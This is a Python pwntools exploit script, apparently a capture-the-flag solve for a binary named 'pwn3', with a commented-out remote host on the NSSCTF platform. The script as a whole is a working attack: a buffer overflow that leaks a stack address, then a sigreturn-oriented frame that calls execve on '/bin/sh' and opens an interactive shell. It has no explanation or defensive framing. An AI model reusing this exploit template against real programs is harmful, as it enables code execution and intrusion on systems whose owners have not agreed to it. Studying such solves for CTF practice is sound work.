from pwn import *

context(os="linux", arch="amd64")
io = process("./pwn3")
#io = remote("node5.anna.nssctf.cn", 23312)

main = 0x4004f1
syscall_ret = 0x400517
ret15 = 0x4004da

payload = b"a" * (0x10) + p64(main)
io.send(payload)
output = io.recv()
stack_addr = u64(output[32:38].ljust(8, b"\x00"))
print("stack address =", hex(stack_addr))

sigFrame = SigreturnFrame()
sigFrame.rax = constants.SYS_execve  # pyright: ignore[reportAttributeAccessIssue]
sigFrame.rdi = stack_addr - 0x160
sigFrame.rsi = 0
sigFrame.rdx = 0
sigFrame.rip = syscall_ret

payload = b"/bin/sh\x00".ljust(0x10, b'\x00') + p64(ret15) + p64(syscall_ret) + bytes(sigFrame)

gdb.attach(io)
io.send(payload)


io.interactive()
